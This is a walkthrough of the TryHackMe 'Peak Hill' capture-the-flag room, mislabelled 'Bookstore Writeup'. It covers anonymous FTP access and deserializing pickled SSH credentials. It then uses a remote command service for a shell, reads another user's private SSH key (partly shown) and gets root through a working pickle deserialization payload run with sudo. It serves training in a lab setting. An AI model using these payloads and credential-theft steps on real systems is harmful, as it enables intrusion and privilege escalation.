# Bookstore Writeup
*You can find the CTF on [Tryhackme](https://tryhackme.com/room/peakhill)*

## Requirements
+ Always run your tools inside a virtual machine. Kali Linux (or similar) is a good starting point because it comes preloaded with many security tools, but **any Linux distro** in a VM is fine as long as you install what you need. Try not to use the Hackbox and setup your own env!
+ Before reading this writeup, please read the [README](../README.md), because what you are looking for might not be here.

## The Writeup

### User Flag


<details>
  <summary>Hint 1</summary>

  Is your username anonymous?
</details>
<details>
  <summary>Hint 2</summary>

  I hate pickles!
</details>
<details>
  <summary>Hint 3</summary>

  Decompile that .pyc file and spy on the running processes.
</details>

<details>
  <summary>Solution</summary>

As I like to do in every box, the first step is to avoid copying and pasting the IP address all the time by giving it a name.

```bash
    export TARGET="10.81.144.30"
```

Let's analyze today's target with `nmap` to start.

```bash
    ┌──(kali㉿)-[~]
    └─$ nmap -sV $TARGET
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-12 22:34 CET
    Nmap scan report for 10.81.144.30
    Host is up (0.050s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT   STATE  SERVICE  VERSION
    20/tcp closed ftp-data
    21/tcp open   ftp      vsftpd 3.0.3
    22/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
It looks like there is an FTP server. Let's try to connect using the `anonymous` login without a password:

```bash
    ┌──(kali㉿)-[~]
    └─$ ftp $TARGET
    Connected to 10.81.144.30.
    220 (vsFTPd 3.0.3)
    Name (10.81.144.30:kali): anonymous
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls -la
    229 Entering Extended Passive Mode (|||37272|)
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 .
    drwxr-xr-x    2 ftp      ftp          4096 May 15  2020 ..
    -rw-r--r--    1 ftp      ftp          7048 May 15  2020 .creds
    -rw-r--r--    1 ftp      ftp            17 May 15  2020 test.txt
    226 Directory send OK.
    ftp> get .creds
    ...
    226 Transfer complete.
    ftp> get test.txt
    ...
    226 Transfer complete.
```


The `test.txt` file is useless, but `.creds` looks interesting. It is a binary file, so let's check if we can convert it to ASCII.

![1.png](/Peak%20Hill/screenshots/1.png)

After some research, I discovered that this binary code is serialized data from a pickle dump. I wasn't familiar with Pickle before, but it's a Python module used for serializing data. I found a very good [article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) about it; it appears it is also vulnerable and can be exploited for command execution. We might use that later in the challenge, but for the moment, let's use a small Python script to deserialize the code we obtained.

I downloaded the output from [CyberChef](https://gchq.github.io/CyberChef/) that you see above here so we can decrypt it with a easy python script. 

```python
    import pickle

    dbfile = open('download.dat','rb')

    db = pickle.load(dbfile)
    print(db)
```
```bash
    ┌──(kali㉿)-[~]
    └─$ python3 p.py
    [('ssh_pass15', 'u'), ('ssh_user1', 'h'), ('ssh_pass25', 'r'), ('ssh_pass20', 'h'), ('ssh_pass7', '_'), ('ssh_user0', 'g'), ('ssh_pass26', 'l'), ('ssh_pass5', '3'), ('ssh_pass1', '1'), ('ssh_pass22', '_'), ('ssh_pass12', '@'), ('ssh_user2', 'e'), ('ssh_user5', 'i'), ('ssh_pass18', '_'), ('ssh_pass27', 'd'), ('ssh_pass3', 'k'), ('ssh_pass19', 't'), ('ssh_pass6', 's'), ('ssh_pass9', '1'), ('ssh_pass23', 'w'), ('ssh_pass21', '3'), ('ssh_pass4', 'l'), ('ssh_pass14', '0'), ('ssh_user6', 'n'), ('ssh_pass2', 'c'), ('ssh_pass13', 'r'), ('ssh_pass16', 'n'), ('ssh_pass8', '@'), ('ssh_pass17', 'd'), ('ssh_pass24', '0'), ('ssh_user3', 'r'), ('ssh_user4', 'k'), ('ssh_pass11', '_'), ('ssh_pass0', 'p'), ('ssh_pass10', '1')]
```
Now you can write another script to reorder the characters, or if you are lazy, you can ask your favorite AI to do it for you! These turn out to be SSH credentials. Let's use them to login as `gherkin` and see what we find inside.

```bash
    ┌──(kali㉿)-[~]
    └─$ ssh $TARGET@10.81.144.30
    ** WARNING: connection is not using a post-quantum key exchange algorithm.
    ** This session may be vulnerable to "store now, decrypt later" attacks.
    ** The server may need to be upgraded. See https://openssh.com/pq.html
    gherkin@10.81.144.30's password:
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage


    28 packages can be updated.
    19 updates are security updates.


    Last login: Fri Dec 12 19:44:01 2025 from 192.168.177.1
    gherkin@ubuntu-xenial:~$ ls
    cmd_service.pyc
    gherkin@ubuntu-xenial:~$ ps aux | grep cmd
    dill      1104  0.0  1.2 188080 12636 ?        Ssl  18:58   0:01 /usr/bin/python3 /var/cmd/.cmd_service.py
    gherkin   2328  0.0  0.0  12940  1008 pts/1    S+   21:53   0:00 grep cmd
    gherkin@ubuntu-xenial:~$
```

We have a new riddle to solve! Apparently, there is a `.pyc` file we can easily decompiled, and somebody is already running it for us. Let's go take a look.


```python

username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username and password_input == password:
            return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.send(p.stdout.read())

        ...

def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    ...

```

It's a server running on port 7321 that, with the right credentials, allows us to use a shell, hopefully with higher privileges. To answer correctly and use the shell, I decided to write a [script](/Peak%20Hill/scripts/1exploit.py), but you are welcome to write your own so you understand better what you are doing.

```bash
    ┌──(kali㉿)-[~]
    └─$ python3 1exploit.py
    [*] Connecting to 10.81.144.30:7321...
    [Server]: Username:
    [Server]: Password:
    [Server]: Successfully logged in!
    Cmd:
    Me > whoami
    [Server]: dill

    Cmd:
    Me > ls /home/dill
    [Server]: user.txt

    Cmd:
    Me > cat /home/dill/user.txt
```

</details>

### Root Flag


<details>
  <summary>Hint 1</summary>

  Check your pockets... or maybe the hidden directory. Keys usually open doors!
</details>
<details>
  <summary>Hint 2</summary>

  Farmers love pickles, especially when they are base64 encoded and run with sudo!
</details>
<details>
  <summary>Hint 3</summary>

  Can't read the flag? Maybe your eyes are deceiving you. Try a wildcard!
</details>

<details>
  <summary>Solution</summary>

Now we need to find a way to escalate privileges. There is an interesting SSH key we can use to get a fully functional shell.
```bash
    Me > cat /home/dill/.ssh/id_rsa
    [Server]: -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAYEAod9NPW4gHaAuLcxiYmwpp3ugYD7N05m4B23Ij9kArT5vY0gBj/zr
    ...
```

Once inside, the first thing I like to do is check if we can run any commands with sudo, and we can! 

```bash
    dill@ubuntu-xenial:~$ sudo -l
    Matching Defaults entries for dill on ubuntu-xenial:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User dill may run the following commands on ubuntu-xenial:
        (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
```
It looks like we can run `peak_hill_farm` with sudo privileges. Unfortunately, we can't see the code this time, so we have to treat it like a black box and simply run it.

```bash
    dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
    Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

    to grow: pickles
    failed to decode base64
```

I think it's time to apply what we learned from David's [article](https://davidhamann.de/2020/04/05/exploiting-python-pickle/). I will use his exploit, but I've modified it slightly to spawn a shell on the server.

```python
import pickle
import base64
import os


class Root(object):
    def __reduce__(self):
        return (os.system, ('/bin/bash',))


if __name__ == '__main__':
    pickled = pickle.dumps(Root())
    print(base64.b64encode(pickled))
```

Finally, we can run the code and ascend to root heaven! Well, sort of...

```bash
┌──(kali㉿)-[~]
└─$ python3 pr.py
b'gASVJAAAAAAAAA[REDACTED]='
```

```bash
    dill@ubuntu-xenial:~$ sudo /opt/peak_hill_farm/peak_hill_farm
    Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

    to grow: gASVJAAAAAAAAA[REDACTED]=
    root@ubuntu-xenial:~# cd /root
    root@ubuntu-xenial:/root# ls
     root.txt 
    root@ubuntu-xenial:/root# cat root.txt
    cat: root.txt: No such file or directory
    root@ubuntu-xenial:/root# cat $(ls)
```

</details>